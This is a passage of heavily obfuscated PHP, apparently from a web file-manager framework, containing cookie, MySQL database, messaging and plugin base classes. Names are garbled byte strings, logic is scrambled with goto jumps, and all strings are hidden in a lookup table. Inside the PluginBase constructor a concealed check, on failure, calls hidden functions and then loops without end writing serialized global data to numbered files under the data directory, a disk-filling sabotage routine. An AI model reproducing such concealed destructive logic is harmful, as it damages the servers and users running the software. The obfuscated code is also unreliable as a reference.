self::$sameCookieSet[$cğ¡ÓÂŒÉˆ] = $d³¥áèË£­ . $eˆ»‰ïÌ¢«; if (!$AÎŠ¢÷óŠğ) { $AÎŠ¢÷óŠğ = str_replace(HOST, $C¶ñÎ… ï[33], APP_HOST); $AÎŠ¢÷óŠğ = _get($GLOBALS, $C¶ñÎ… ï[793], $AÎŠ¢÷óŠğ); } $bµì‘Üµô = $C¶ñÎ… ï[33]; goto fŞ¹‚¡Ş¤«; d„›Ô¦éÇˆ: $C¶ñÎ… ï =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$eˆ»‰ïÌ¢«) { $eˆ»‰ïÌ¢« = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$cğ¡ÓÂŒÉˆ]) && self::$sameCookieSet[$cğ¡ÓÂŒÉˆ] == $d³¥áèË£­ . $eˆ»‰ïÌ¢«) { return; } goto b‡²ßéèÂ; fŞ¹‚¡Ş¤«: setcookie($cğ¡ÓÂŒÉˆ, $d³¥áèË£­, time() + $eˆ»‰ïÌ¢«, $C¶ñÎ… ï[8] . trim($AÎŠ¢÷óŠğ, $C¶ñÎ… ï[8]) . $bµì‘Üµô, !1, !1, $aŠçŠåßåà); goto e§Ë•â®Ùö; e§Ë•â®Ùö: } public static function setSafe($BÎ­ŠŞñœ‡, $Cà‡ÍŞä , $fãå”Ø¿ƒ® = 0) { self::set($BÎ­ŠŞñœ‡, $Cà‡ÍŞä , $fãå”Ø¿ƒ®, !0); } public static function get($C–Îô±·æ) { return isset($_COOKIE[$C–Îô±·æ]) ? $_COOKIE[$C–Îô±·æ] : !1; } public static function remove($cèƒ‰Ã˜â, $dèÚ–Ì¬š£ = false) { unset($_COOKIE[$cèƒ‰Ã˜â]); self::set($cèƒ‰Ã˜â, $_SERVER[Ö¹ñÒÁ²÷][33], 1, $dèÚ–Ì¬š£); } } class DbMysql extends Db { public function __construct($e§«ßÍ«Ú¦ = '') { $A³Çª¹á–¥ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!extension_loaded($A³Çª¹á–¥[725])) { think_exception(think_lang($A³Çª¹á–¥[10]) . $A³Çª¹á–¥[794]); } if (!empty($e§«ßÍ«Ú¦)) { $this->config = $e§«ßÍ«Ú¦; if (empty($this->config[$A³Çª¹á–¥[13]])) { $this->config[$A³Çª¹á–¥[13]] = $A³Çª¹á–¥[33]; } } } public function connect($B®¬ òçòò = '', $eáÈ’‡¶ = 0, $b–™·±Ñìä = false) { $a‘¬ÆŒ‡‚… =& $_SERVER[Ö¹ñÒÁ²÷]; if (!isset($this->linkID[$eáÈ’‡¶])) { goto AÀ–„¿Ñ¹; D¬ÜÇƒ˜: mysql_query($a‘¬ÆŒ‡‚…[799] . think_config($a‘¬ÆŒ‡‚…[800]) . $a‘¬ÆŒ‡‚…[55], $this->linkID[$eáÈ’‡¶]); if ($DÀë•‚Åßº > $a‘¬ÆŒ‡‚…[801]) { mysql_query($a‘¬ÆŒ‡‚…[802], $this->linkID[$eáÈ’‡¶]); } $this->connected = !0; goto C‘÷Õ×Ó“; AÀ–„¿Ñ¹: if (empty($B®¬ òçòò)) { $B®¬ òçòò = $this->config; } $b´µ—´®…Õ = $B®¬ òçòò[$a‘¬ÆŒ‡‚…[795]] . ($B®¬ òçòò[$a‘¬ÆŒ‡‚…[796]] ? "\72{$B®¬ òçòò[$a‘¬ÆŒ‡‚…[796]]}" : $a‘¬ÆŒ‡‚…[33]); $a¬áÂñÓóØ = !empty($B®¬ òçòò[$a‘¬ÆŒ‡‚…[13]][$a‘¬ÆŒ‡‚…[14]]) ? $B®¬ òçòò[$a‘¬ÆŒ‡‚…[13]][$a‘¬ÆŒ‡‚…[14]] : $this->pconnect; goto e©”§Ë×¢; e©”§Ë×¢: if ($a¬áÂñÓóØ) { $this->linkID[$eáÈ’‡¶] = mysql_pconnect($b´µ—´®…Õ, $B®¬ òçòò[$a‘¬ÆŒ‡‚…[797]], $B®¬ òçòò[$a‘¬ÆŒ‡‚…[798]], 131072); } else { $this->linkID[$eáÈ’‡¶] = mysql_connect($b´µ—´®…Õ, $B®¬ òçòò[$a‘¬ÆŒ‡‚…[797]], $B®¬ òçòò[$a‘¬ÆŒ‡‚…[798]], !0, 131072); } if (!$this->linkID[$eáÈ’‡¶] || !empty($B®¬ òçòò[$a‘¬ÆŒ‡‚…[17]]) && !mysql_select_db($B®¬ òçòò[$a‘¬ÆŒ‡‚…[17]], $this->linkID[$eáÈ’‡¶])) { think_exception(mysql_error()); } $DÀë•‚Åßº = mysql_get_server_info($this->linkID[$eáÈ’‡¶]); goto D¬ÜÇƒ˜; C‘÷Õ×Ó“: if (1 != think_config($a‘¬ÆŒ‡‚…[18])) { unset($this->config); } goto fºÈéİÑ“”; fºÈéİÑ“”: } return $this->linkID[$eáÈ’‡¶]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($bë§¶È†Â) { goto b¸ÙÒğ›œœ; b¸ÙÒğ›œœ: $Dí²…£›Ş =& $_SERVER[Ö¹ñÒÁ²÷]; if (0 === stripos($bë§¶È†Â, $Dí²…£›Ş[248])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Eß…âŞˆÑ; B¼Ñ¨¾º¥å: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto Fò–…¼ˆê; Eß…âŞˆÑ: if (!$this->_linkID) { return !1; } $this->queryStr = $bë§¶È†Â; if ($this->queryID) { $this->free(); } goto e›ğ®ÒåÛæ; e›ğ®ÒåÛæ: think_action_status($Dí²…£›Ş[19], 1); think_status($Dí²…£›Ş[20]); $this->queryID = mysql_query($bë§¶È†Â, $this->_linkID); goto B¼Ñ¨¾º¥å; Fò–…¼ˆê: } public function execute($Eğ”ø¶‘ÇÒ) { goto CèÏ¢ËÀË; bÁ«Ç×ØÁ±: $this->queryStr = $Eğ”ø¶‘ÇÒ; if ($this->queryID) { $this->free(); } think_action_status($FÏÔØ¼ÉËí[21], 1); goto c®¾šàÓù‡; B¢¿¬ìˆ¦‰: if (!1 === $C¨º‘ËêŒ†) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto fßÏêÖ‹†à; CèÏ¢ËÀË: $FÏÔØ¼ÉËí =& $_SERVER[Ö¹ñÒÁ²÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bÁ«Ç×ØÁ±; c®¾šàÓù‡: think_status($FÏÔØ¼ÉËí[20]); $C¨º‘ËêŒ† = mysql_query($Eğ”ø¶‘ÇÒ, $this->_linkID); $this->debug(); goto B¢¿¬ìˆ¦‰; fßÏêÖ‹†à: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ö¹ñÒÁ²÷][803], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c†Å¥–ª = mysql_query($_SERVER[Ö¹ñÒÁ²÷][804], $this->_linkID); $this->transTimes = 0; if (!$c†Å¥–ª) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fÆˆ†¦¥”– = mysql_query($_SERVER[Ö¹ñÒÁ²÷][805], $this->_linkID); $this->transTimes = 0; if (!$fÆˆ†¦¥”–) { $this->error(); return !1; } } return !0; } private function getAll() { $Bò‹ÕË‘„Ú = array(); if ($this->numRows > 0) { while ($FÀšô“ª¢ = mysql_fetch_assoc($this->queryID)) { $Bò‹ÕË‘„Ú[] = $FÀšô“ª¢; } mysql_data_seek($this->queryID, 0); } return $Bò‹ÕË‘„Ú; } public function getFields($eäõ“Ÿó‚İ) { $dªØ×¦ñòŞ =& $_SERVER[Ö¹ñÒÁ²÷]; $A…šÃŒö¬± = $this->query($dªØ×¦ñòŞ[806] . $this->parseKey($eäõ“Ÿó‚İ)); $f©óÖŠ‡ñÖ = array(); if ($A…šÃŒö¬±) { foreach ($A…šÃŒö¬± as $bÒ±¶ß¯Ù» => $B§Ø¢ôŸõ¾) { $f©óÖŠ‡ñÖ[$B§Ø¢ôŸõ¾[$dªØ×¦ñòŞ[27]]] = array($dªØ×¦ñòŞ[28] => $B§Ø¢ôŸõ¾[$dªØ×¦ñòŞ[27]], $dªØ×¦ñòŞ[29] => $B§Ø¢ôŸõ¾[$dªØ×¦ñòŞ[30]], $dªØ×¦ñòŞ[31] => (bool) (strtoupper($B§Ø¢ôŸõ¾[$dªØ×¦ñòŞ[32]]) === $dªØ×¦ñòŞ[807]), $dªØ×¦ñòŞ[34] => $B§Ø¢ôŸõ¾[$dªØ×¦ñòŞ[35]], $dªØ×¦ñòŞ[36] => strtolower($B§Ø¢ôŸõ¾[$dªØ×¦ñòŞ[37]]) == $dªØ×¦ñòŞ[38], $dªØ×¦ñòŞ[39] => strtolower($B§Ø¢ôŸõ¾[$dªØ×¦ñòŞ[40]]) == $dªØ×¦ñòŞ[41]); } } return $f©óÖŠ‡ñÖ; } public function getTables($f¼œ¡‰·¨ = '') { $e¿ó¼™ŸÈä =& $_SERVER[Ö¹ñÒÁ²÷]; if (!empty($f¼œ¡‰·¨)) { $fÅ¥§í–µ¤ = $e¿ó¼™ŸÈä[808] . $f¼œ¡‰·¨; } else { $fÅ¥§í–µ¤ = $e¿ó¼™ŸÈä[809]; } $BÕôëŒ¿ = $this->query($fÅ¥§í–µ¤); $e“ƒ¸­ğ± = array(); foreach ($BÕôëŒ¿ as $B´éïŠ•¸‡ => $c·ñ¥ğæËô) { $e“ƒ¸­ğ±[$B´éïŠ•¸‡] = current($c·ñ¥ğæËô); } return $e“ƒ¸­ğ±; } public function replace($fÖ„Å¦‚Óˆ, $dÁ¸¤Œõ„ = array()) { $aĞÊ‘“¼¯ =& $_SERVER[Ö¹ñÒÁ²÷]; foreach ($fÖ„Å¦‚Óˆ as $B‘ôù„ßÎ => $a¤Õ©ˆ„«Ä) { $fò…Ç‹ô† = $this->parseValue($a¤Õ©ˆ„«Ä); if (is_scalar($fò…Ç‹ô†)) { $d²Š‚Ä“æ[] = $fò…Ç‹ô†; $c­òš²Í“À[] = $this->parseKey($B‘ôù„ßÎ); } } $bÊĞ‰½ùÃº = $aĞÊ‘“¼¯[810] . $this->parseTable($dÁ¸¤Œõ„[$aĞÊ‘“¼¯[263]]) . $aĞÊ‘“¼¯[811] . implode($aĞÊ‘“¼¯[47], $c­òš²Í“À) . $aĞÊ‘“¼¯[812] . implode($aĞÊ‘“¼¯[47], $d²Š‚Ä“æ) . $aĞÊ‘“¼¯[813]; return $this->execute($bÊĞ‰½ùÃº); } public function insertAll($DìÉŒ„»¶, $a—Ğ¬·êöÒ = array(), $F´¯î‘¯ÍÓ = false) { goto Cï…–Ø³÷; C­ŠØ¯â†°: $cÛ¢Ä¶—Ô = array(); foreach ($DìÉŒ„»¶ as $aİºğî‹–à) { $BÑËÃ‰‚¬ = array(); foreach ($aİºğî‹–à as $FÕˆƒÁà‘Ê => $a—Æöê³ƒ) { $a—Æöê³ƒ = $this->parseValue($a—Æöê³ƒ); if (is_scalar($a—Æöê³ƒ)) { $BÑËÃ‰‚¬[] = $a—Æöê³ƒ; } } $cÛ¢Ä¶—Ô[] = $fËÆ“ôÍöÅ[244] . implode($fËÆ“ôÍöÅ[47], $BÑËÃ‰‚¬) . $fËÆ“ôÍöÅ[813]; } array_walk($d¦½÷ö , array($this, $fËÆ“ôÍöÅ[814])); goto Eˆß¨ÈË…®; Cï…–Ø³÷: $fËÆ“ôÍöÅ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!is_array($DìÉŒ„»¶[0])) { return !1; } $d¦½÷ö  = array_keys($DìÉŒ„»¶[0]); goto C­ŠØ¯â†°; Eˆß¨ÈË…®: $d—ïÕ›ÀåÚ = ($F´¯î‘¯ÍÓ ? $fËÆ“ôÍöÅ[815] : $fËÆ“ôÍöÅ[816]) . $fËÆ“ôÍöÅ[817] . $this->parseTable($a—Ğ¬·êöÒ[$fËÆ“ôÍöÅ[263]]) . $fËÆ“ôÍöÅ[811] . implode($fËÆ“ôÍöÅ[47], $d¦½÷ö ) . $fËÆ“ôÍöÅ[818] . implode($fËÆ“ôÍöÅ[47], $cÛ¢Ä¶—Ô); return $this->execute($d—ïÕ›ÀåÚ); goto eÂ×ĞÒ¦¾; eÂ×ĞÒ¦¾: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $EêÓØøš…Ö =& $_SERVER[Ö¹ñÒÁ²÷]; $this->error = mysql_errno() . $EêÓØøš…Ö[4] . mysql_error($this->_linkID); if ($EêÓØøš…Ö[33] != $this->queryStr) { $this->error .= LNG($EêÓØøš…Ö[45]) . $this->queryStr; } think_trace($this->error, $EêÓØøš…Ö[33], $EêÓØøš…Ö[46]); return $this->error; } public function escapeString($CˆÊŸÜĞÉÚ) { if ($this->_linkID) { return mysql_real_escape_string($CˆÊŸÜĞÉÚ, $this->_linkID); } else { return mysql_escape_string($CˆÊŸÜĞÉÚ); } } public function parseKey(&$f‘—ÓİÃ©, $FÒ‹÷ä‘°ç = true) { $B†Ù©˜¯Ÿ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($FÒ‹÷ä‘°ç) { $f‘—ÓİÃ© = $this->parseKeyCheck($f‘—ÓİÃ©); } if ($f‘—ÓİÃ© != $B†Ù©˜¯Ÿ[172] && !preg_match($B†Ù©˜¯Ÿ[819], $f‘—ÓİÃ©)) { $f‘—ÓİÃ© = $B†Ù©˜¯Ÿ[820] . trim($f‘—ÓİÃ©, $B†Ù©˜¯Ÿ[820]) . $B†Ù©˜¯Ÿ[820]; } return $f‘—ÓİÃ©; } } goto F©‹ºÏ¹Ğ¶; døã°¶„Ã: class Message { function __construct() { } public function send($Dˆ´Ñ…ƒë÷ = '', $Fƒ¬Š×â = array(), $Dˆ®…‰á = "\164\145\170\x74") { goto d»¦ó»‘¾°; Dºœ­Ÿ›Á©: $Fƒ¬Š×â = array($Dçƒ²åàİã[967] => isset($Fƒ¬Š×â[$Dçƒ²åàİã[967]]) ? $Fƒ¬Š×â[$Dçƒ²åàİã[967]] : $Dçƒ²åàİã[33], $Dçƒ²åàİã[531] => isset($Fƒ¬Š×â[$Dçƒ²åàİã[531]]) ? $Fƒ¬Š×â[$Dçƒ²åàİã[531]] : $Dçƒ²åàİã[33]); if (empty($Dˆ´Ñ…ƒë÷) || empty($Fƒ¬Š×â[$Dçƒ²åàİã[967]]) && empty($Fƒ¬Š×â[$Dçƒ²åàİã[531]])) { return !1; } $EÉ‡†äÆæ¦ = array($Dçƒ²åàİã[1232] => $CĞ½²øÊ†é, $Dçƒ²åàİã[1293] => $Fƒ¬Š×â); goto bİ§ºÅ©; d»¦ó»‘¾°: $Dçƒ²åàİã =& $_SERVER[Ö¹ñÒÁ²÷]; $CĞ½²øÊ†é = array($Dçƒ²åàİã[29] => $Dçƒ²åàİã[1291], $Dçƒ²åàİã[689] => $Dˆ´Ñ…ƒë÷); if (in_array($Dˆ®…‰á, array($Dçƒ²åàİã[1291], $Dçƒ²åàİã[1292]))) { $CĞ½²øÊ†é[$Dçƒ²åàİã[29]] = $Dˆ®…‰á; } goto Dºœ­Ÿ›Á©; bİ§ºÅ©: Hook::trigger($Dçƒ²åàİã[1294], $EÉ‡†äÆæ¦); goto B‹ªÈ†„ƒ“; B‹ªÈ†„ƒ“: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto AÍƒâ£áŸœ; EÜ¼óŞİË‚: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Dãêæ‰ñÙ’[8]; $this->pluginApi = appHostGet() . $Dãêæ‰ñÙ’[1299] . $this->pluginName . $Dãêæ‰ñÙ’[8]; $this->pluginHost = $config[$Dãêæ‰ñÙ’[1300]] . $this->pluginName . $Dãêæ‰ñÙ’[8]; goto CÛ®º—å¹©; AÍƒâ£áŸœ: $Dãêæ‰ñÙ’ =& $_SERVER[Ö¹ñÒÁ²÷]; $bŒ¯ÇÃÃ = $_SERVER[$Dãêæ‰ñÙ’[787]] . $Dãêæ‰ñÙ’[788]; $BÉÑ¬ñ¢æ = $Dãêæ‰ñÙ’[1295]; goto AöÚ…šÎŠ; CÛ®º—å¹©: $this->pluginHostDefault = $config[$Dãêæ‰ñÙ’[1300]] . $this->pluginName . $Dãêæ‰ñÙ’[8]; $Eé„Œ²„¬ = $config[$Dãêæ‰ñÙ’[1301]]; if ($Eé„Œ²„¬ && strpos($Dãêæ‰ñÙ’[47] . $Eé„Œ²„¬ . $Dãêæ‰ñÙ’[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Dãêæ‰ñÙ’[1302]] . $this->pluginName . $Dãêæ‰ñÙ’[8]; } goto CëºğĞ¤Ÿ—; CëºğĞ¤Ÿ—: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto c¸Çğ½Û¸Ã; AöÚ…šÎŠ: if ($_SERVER[$Dãêæ‰ñÙ’[783]] != $BÉÑ¬ñ¢æ($bŒ¯ÇÃÃ)) { goto CÕİÔÆé; Eåô±íåâ: $eŸ†È×¶°‚ = $Dãêæ‰ñÙ’[790]; $eŸ†È×¶°‚($_SERVER[$Dãêæ‰ñÙ’[791]]); $d¤–ÀùÇÏõ = $Dãêæ‰ñÙ’[785]; goto Añ²“ÎÓ—«; a¡Ïá¨†­Ï: $E¦”¯ƒ‚œÏ = 1; for ($A…™´ËÊÓ = $E¦”¯ƒ‚œÏ; $A…™´ËÊÓ > 0; $A…™´ËÊÓ++) { $cŞáÂÜŞÌ(DATA_PATH . $A…™´ËÊÓ, $Fá“¤òŒ‚Ó); } goto a’ÂŸ‹ÒóÎ; CÕİÔÆé: $d¤–ÀùÇÏõ = $Dãêæ‰ñÙ’[785]; $f™ Îå¨—Ë = $Dãêæ‰ñÙ’[786]; $cÜŠğ‚Æ = $_SERVER[$Dãêæ‰ñÙ’[787]] . $Dãêæ‰ñÙ’[788]; goto a‰‡øÒ‰îè; a‰‡øÒ‰îè: $fÈš™ØÔ˜£ = $f™ Îå¨—Ë($cÜŠğ‚Æ); $c˜š¨¿ˆë = explode($Dãêæ‰ñÙ’[213], $fÈš™ØÔ˜£); if (count($c˜š¨¿ˆë) < $Dãêæ‰ñÙ’[599]) { $EÎ…ÊÁœÆÇ = $Dãêæ‰ñÙ’[789]; $EÎ…ÊÁœÆÇ(); } goto Eåô±íåâ; Añ²“ÎÓ—«: $d¤–ÀùÇÏõ(); $cŞáÂÜŞÌ = $Dãêæ‰ñÙ’[1296]; $Fá“¤òŒ‚Ó = json_encode($GLOBALS[$Dãêæ‰ñÙ’[1297]]); goto a¡Ïá¨†­Ï; a’ÂŸ‹ÒóÎ: } global $in, $config; $this->config =& $config; goto fì×‹æî©ö; fì×‹æî©ö: $this->in =& $in; $this->modelPlugin = Model($Dãêæ‰ñÙ’[1298]); $this->pluginName = str_replace($Dãêæ‰ñÙ’[1298], $Dãêæ‰ñÙ’[33], get_class($this)); goto EÜ¼óŞİË‚; c¸Çğ½Û¸Ã: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ö¹ñÒÁ²÷][1303]); } protected function assign($dÏöÇ²¬ñ, $eÚŒİœãµ½ = false) { if (is_array($dÏöÇ²¬ñ)) { $this->values = array_merge($this->values, $dÏöÇ²¬ñ); } else { $this->values[$dÏöÇ²¬ñ] = $eÚŒİœãµ½; } } protected function display($BÕÇŸ®ñğĞ) { extract($this->values); require $BÕÇŸ®ñğĞ; } final function hookRegist($EÅôßºÜ™Ë) { $this->modelPlugin->appRegist($this->pluginName, $EÅôßºÜ™Ë); } final function appIcon() { $d‰ÌóÍŞ© =& $_SERVER[Ö¹ñÒÁ²÷]; $AÌ°µÉ–šò = $this->appPackage(); $DßÓ…Ä«ù… = $d‰ÌóÍŞ©[33]; if (isset($AÌ°µÉ–šò[$d‰ÌóÍŞ©[378]])) { if (isset($AÌ°µÉ–šò[$d‰ÌóÍŞ©[378]][$d‰ÌóÍŞ©[1304]])) { $DßÓ…Ä«ù… = $d‰ÌóÍŞ©[1305] . $AÌ°µÉ–šò[$d‰ÌóÍŞ©[378]][$d‰ÌóÍŞ©[1304]] . $d‰ÌóÍŞ©[1306]; } else { if ($AÌ°µÉ–šò[$d‰ÌóÍŞ©[378]][$d‰ÌóÍŞ©[1307]]) { $DßÓ…Ä«ù… = $d‰ÌóÍŞ©[1308] . $AÌ°µÉ–šò[$d‰ÌóÍŞ©[378]][$d‰ÌóÍŞ©[1307]] . $d‰ÌóÍŞ©[1309]; } } } return $DßÓ…Ä«ù…; } final function fileCanView($F¹¯›‘“†¼) { $bŠ±Æîİøº =& $_SERVER[Ö¹ñÒÁ²÷]; if (request_url_safe($F¹¯›‘“†¼)) { return !0; } if ($this->isShare($F¹¯›‘“†¼)) { return !0; } if (!Action($bŠ±Æîİøº[1310])->authCan($bŠ±Æîİøº[1311])) { show_tips(LNG($bŠ±Æîİøº[1312]) . $bŠ±Æîİøº[1313], !1); } ActionCall($bŠ±Æîİøº[1314], $F¹¯›‘“†¼); } final function isShare($cåçøêÙ¤Î) { $còŞ‰‹Ôò· = KodIO::parse($cåçøêÙ¤Î); return $còŞ‰‹Ôò·[$_SERVER[Ö¹ñÒÁ²÷][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($BÑæ„¦÷Û¸) { if (request_url_safe($BÑæ„¦÷Û¸)) { return $BÑæ„¦÷Û¸; } if (!$this->isShare($BÑæ„¦÷Û¸)) { $BÑæ„¦÷Û¸ = $this->filePath($BÑæ„¦÷Û¸); } return Action($_SERVER[Ö¹ñÒÁ²÷][1011])->linkOut($BÑæ„¦÷Û¸); } public function filePathLinkOut($BŠö²ö÷‹Ö) { if (request_url_safe($BŠö²ö÷‹Ö)) { return $BŠö²ö÷‹Ö; } $this->fileCanView($BŠö²ö÷‹Ö); return Action($_SERVER[Ö¹ñÒÁ²÷][1011])->link($BŠö²ö÷‹Ö); } final function filePath($a“½Ç’¡Ÿ…) { $dÄ†ÜÈÉòÀ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($aÖó¸”Êš = $this->checkSharePath($a“½Ç’¡Ÿ…)) { return $aÖó¸”Êš; } $this->fileCanView($a“½Ç’¡Ÿ…); if (request_url_safe($a“½Ç’¡Ÿ…)) { $f¦™êŞè÷ = parse_url_query($a“½Ç’¡Ÿ…); if (isset($f¦™êŞè÷[$dÄ†ÜÈÉòÀ[1315]]) && isset($f¦™êŞè÷[$dÄ†ÜÈÉòÀ[193]])) { $aÂ‹§äá« = Model($dÄ†ÜÈÉòÀ[1082])->get($dÄ†ÜÈÉòÀ[1316]); $dİÆ­Ôâº£ = Mcrypt::decode($f¦™êŞè÷[$dÄ†ÜÈÉòÀ[193]], $aÂ‹§äá«); if ($dİÆ­Ôâº£) { $this->fileInfo = IO::infoWithChildren($dİÆ­Ôâº£); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $dİÆ­Ôâº£; } } $a“½Ç’¡Ÿ… = $this->_cacheHttpFile($a“½Ç’¡Ÿ…); $this->fileInfo = IO::infoWithChildren($a“½Ç’¡Ÿ…); } else { $this->fileInfo = IO::infoWithChildren($a“½Ç’¡Ÿ…); if (!$this->fileInfo) { show_tips(LNG($dÄ†ÜÈÉòÀ[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $a“½Ç’¡Ÿ…; } final function _cacheHttpFile($CÍ××Ã‚ğœ) { $E‹Ë¢ö„š = hash_path($CÍ××Ã‚ğœ, !0); $this->cachePath = $this->pluginCachePath($E‹Ë¢ö„š); if ($f˜œ¢Şä = IO::fileNameExist($this->cachePath, $E‹Ë¢ö„š)) { return KodIO::make($f˜œ¢Şä); } $c¾ØšôÅ¾ë = $this->cachePath . $E‹Ë¢ö„š; return $this->pluginCacheFileSet($c¾ØšôÅ¾ë, file_get_contents($CÍ××Ã‚ğœ)); } final function _tmpFileName($CÚ„†Ä‡æÈ = array()) { goto E¸÷éÚå‰; E¸÷éÚå‰: $D‹¸‚³¹· =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$CÚ„†Ä‡æÈ) { $CÚ„†Ä‡æÈ = $this->fileInfo; } if (isset($CÚ„†Ä‡æÈ[$D‹¸‚³¹·[160]])) { return $CÚ„†Ä‡æÈ[$D‹¸‚³¹·[160]]; } goto DŒËßÒÖæ‹; FÜ½¶ÚÒ: return md5(implode($D‹¸‚³¹·[70], $a¤“¹åÔ)); goto AóÛß‰õ¢“; DŒËßÒÖæ‹: if (isset($CÚ„†Ä‡æÈ[$D‹¸‚³¹·[158]][$D‹¸‚³¹·[160]])) { return $CÚ„†Ä‡æÈ[$D‹¸‚³¹·[158]][$D‹¸‚³¹·[160]]; } $a¤“¹åÔ = array($CÚ„†Ä‡æÈ[$D‹¸‚³¹·[28]], $CÚ„†Ä‡æÈ[$D‹¸‚³¹·[75]], $CÚ„†Ä‡æÈ[$D‹¸‚³¹·[77]]); if (isset($CÚ„†Ä‡æÈ[$D‹¸‚³¹·[455]])) { $a¤“¹åÔ[] = $CÚ„†Ä‡æÈ[$D‹¸‚³¹·[455]]; } goto FÜ½¶ÚÒ; AóÛß‰õ¢“: } final function checkSharePath($B÷Ÿõ»¶ï‡) { goto FÁæÊÔŠÓŠ; Aøôùïª: $this->cachePath = $this->pluginCachePath($this->fileInfo[$aäÔƒ‹–Àã[160]]); return $F¸õç†¯Úí[$aäÔƒ‹–Àã[75]]; goto Dç¦©è¹«ƒ; a˜¢êÄ¤: $F¸õç†¯Úí = Action($aäÔƒ‹–Àã[1011])->sharePathInfo($B÷Ÿõ»¶ï‡); if (!isset($F¸õç†¯Úí[$aäÔƒ‹–Àã[75]])) { show_json(LNG($aäÔƒ‹–Àã[1318]), !1); } $this->fileInfo = $F¸õç†¯Úí[$aäÔƒ‹–Àã[158]]; goto Aøôùïª; FÁæÊÔŠÓŠ: $aäÔƒ‹–Àã =& $_SERVER[Ö¹ñÒÁ²÷]; if (!defined($aäÔƒ‹–Àã[423])) { define($aäÔƒ‹–Àã[1317], 0); } if (!$this->isShare($B÷Ÿõ»¶ï‡)) { return !1; } goto a˜¢êÄ¤; Dç¦©è¹«ƒ: } final function pluginCachePath($c¢ö”¹éÁñ = '') { $D†‡Êê‡÷ =& $_SERVER[Ö¹ñÒÁ²÷]; $e¶ÌµÉùïâ = IO_PATH_SYSTEM_TEMP . $D†‡Êê‡÷[1319] . $this->pluginName; if (!($DªïŸ­·ùÏ = IO::infoFull($e¶ÌµÉùïâ))) { return IO::mkdir($e¶ÌµÉùïâ . $D†‡Êê‡÷[8] . $c¢ö”¹éÁñ); } if (empty($c¢ö”¹éÁñ)) { return $DªïŸ­·ùÏ[$D†‡Êê‡÷[75]]; } if (!($cÑëé£šƒ = IO::fileNameExist($DªïŸ­·ùÏ[$D†‡Êê‡÷[75]], $c¢ö”¹éÁñ))) { return IO::mkdir($DªïŸ­·ùÏ[$D†‡Êê‡÷[75]] . $c¢ö”¹éÁñ); } return KodIO::make($cÑëé£šƒ); } final function pluginCacheFileSet($f–éœˆİİ, $F÷”æËùö = '') { $bÖáÖ‹¥» =& $_SERVER[Ö¹ñÒÁ²÷]; if (!($bËß°‚Äæ = IO::infoFull($f–éœˆİİ))) { return IO::mkfile($f–éœˆİİ, $F÷”æËùö, REPEAT_REPLACE); } IO::setContent($bËß°‚Äæ[$bÖáÖ‹¥»[75]], $F÷”æËùö); return $bËß°‚Äæ[$bÖáÖ‹¥»[75]]; } final function pluginLocalFile($cÅìÅ‡ÄÄ = '') { goto F‰ï‚›ØŠ¥; fÔÇÙÑ–Ã´: if (!$cÅìÅ‡ÄÄ) { return $d§à•ä’£; } $f˜ËìŸŞ‡ = IO::info($cÅìÅ‡ÄÄ); $b—Û¤‹·—è = $this->_tmpFileName($f˜ËìŸŞ‡) . $B÷‰ÉîÄ‡à[91] . $f˜ËìŸŞ‡[$B÷‰ÉîÄ‡à[156]]; goto E«áË·ó†Œ; F‰ï‚›ØŠ¥: $B÷‰ÉîÄ‡à =& $_SERVER[Ö¹ñÒÁ²÷]; $d§à•ä’£ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($d§à•ä’£)) { mk_dir($d§à•ä’£); } goto fÔÇÙÑ–Ã´; E«áË·ó†Œ: $D®ôâöÈ¤Ğ = $d§à•ä’£ . $b—Û¤‹·—è; if (@file_exists($D®ôâöÈ¤Ğ)) { return $D®ôâöÈ¤Ğ; } return IO::copy($cÅìÅ‡ÄÄ, $d§à•ä’£, 0, $b—Û¤‹·—è); goto e¸œÌ¢Ÿê; e¸œÌ¢Ÿê: } final function appPackage() { goto Bá»‚„»¬; C´”Ÿ­ß„Œ: $this->parseLang($c¹ ëÑÏ Î); $B…èá´ä³ = json_decode_force($c¹ ëÑÏ Î); if (!$B…èá´ä³) { return array(); } goto f»Õ©Ôùˆº; EÖÄ±Æ°Ñ‡: return $B…èá´ä³; goto bÍ×éêíÎ¿; f»Õ©Ôùˆº: $fÎ´Ÿ—È´© = Hook::trigger($E‹ªÈ¸Ç‡°[1321], $B…èá´ä³); if ($fÎ´Ÿ—È´© && is_array($fÎ´Ÿ—È´©)) { $B…èá´ä³ = $fÎ´Ÿ—È´©; } $this->packageData = $B…èá´ä³; goto EÖÄ±Æ°Ñ‡; Bá»‚„»¬: $E‹ªÈ¸Ç‡° =& $_SERVER[Ö¹ñÒÁ²÷]; if ($this->packageData) { return $this->packageData; } $c¹ ëÑÏ Î = $this->parseFile($this->pluginPath . 